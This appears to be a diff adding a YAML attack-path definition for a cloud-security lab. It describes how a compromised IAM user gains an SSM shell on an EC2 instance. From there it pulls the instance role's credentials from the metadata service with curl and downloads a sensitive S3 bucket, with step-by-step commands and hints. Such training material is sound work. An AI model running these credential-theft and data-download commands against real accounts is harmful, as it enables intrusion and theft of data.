@@ -1,0 +1,105 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ssm-001-to-bucket-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to
+        their workstation, compromising a browser session, exploiting a vulnerable workload
+        running in this AWS account, discovering credentials in a public S3 bucket, or finding
+        them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has ssm:StartSession permission, allowing it to start interactive shell
+        sessions on EC2 instances in the account.
+
+    - id: ec2-instance
+      label: "EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
+      description: >
+        This EC2 instance has the SSM agent installed and running, making it accessible via
+        AWS Systems Manager Session Manager. It has an IAM instance profile attached that
+        grants the instance role S3 bucket access permissions. Any process running on this
+        instance — including an attacker with SSM shell access — can query the Instance
+        Metadata Service (IMDS) to retrieve the instance role's temporary credentials.
+
+    - id: ec2-role
+      label: "EC2 Instance Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-001-to-bucket-ec2-role"
+      description: >
+        This IAM role is attached to the EC2 instance as an instance profile. Its temporary
+        credentials are exposed via the Instance Metadata Service and can be extracted by any
+        process running on the instance. The role has S3 permissions granting access to the
+        sensitive target bucket. By exfiltrating these credentials and using them locally,
+        an attacker can access the S3 bucket from outside AWS entirely.
+
+    - id: target-bucket
+      label: "Sensitive S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-sensitive-data-ssm-001-to-bucket-{account_id}-{suffix}"
+      description: >
+        This S3 bucket contains sensitive data. The EC2 instance role has s3:GetObject and
+        s3:ListBucket permissions on this bucket. By extracting the instance role credentials
+        via IMDS during an SSM session and exporting them locally, the attacker can download
+        the bucket's contents from any location.
+
+  edges:
+    - from: starting-user
+      to: ec2-instance
+      label: "ssm:StartSession"
+      description: >
+        Start an interactive shell session on the target EC2 instance using SSM Session
+        Manager. No SSH keys, bastion hosts, or open network ports are required.
+      hints:
+        - "You can interact with compute resources in this account."
+        - "Look for EC2 instances that have IAM roles with interesting permissions."
+        - "SSM Session Manager gives you shell-level access without SSH keys or open ports."
+        - "Browse to https://pathfinding.cloud/paths/ssm-001 for technique details."
+      commands:
+        - description: "Identify SSM-managed instances"
+          command: "aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,ComputerName,IPAddress]' --output table"
+        - description: "Start an interactive session on the target instance"
+          command: "aws ssm start-session --target <instance-id>"
+
+    - from: ec2-instance
+      to: ec2-role
+      label: "curl IMDS"
+      description: >
+        From within the SSM shell session, query the Instance Metadata Service to retrieve
+        the temporary credentials of the EC2 instance role. IMDSv2 requires a token first.
+      hints:
+        - "This instance has an IAM role attached. What permissions does that role have?"
+        - "The Instance Metadata Service at http://169.254.169.254 exposes the role's credentials."
+        - "Use IMDSv2: first get a token with a PUT request, then use it to fetch credentials."
+      commands:
+        - description: "Obtain an IMDSv2 session token"
+          command: "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")"
+        - description: "Get the name of the attached IAM role"
+          command: "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
+        - description: "Retrieve the role's temporary credentials"
+          command: "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
+
+    - from: ec2-role
+      to: target-bucket
+      label: "s3:GetObject"
+      description: >
+        Export the extracted credentials as environment variables locally (after exiting the
+        SSM session), then use them to list and download objects from the sensitive S3 bucket.
+      commands:
+        - description: "Export extracted credentials as environment variables"
+          command: "export AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token>"
+        - description: "Verify credential identity"
+          command: "aws sts get-caller-identity"
+        - description: "List bucket contents"
+          command: "aws s3 ls s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/"
+        - description: "Download sensitive data"
+          command: "aws s3 cp s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/sensitive-data.txt ."
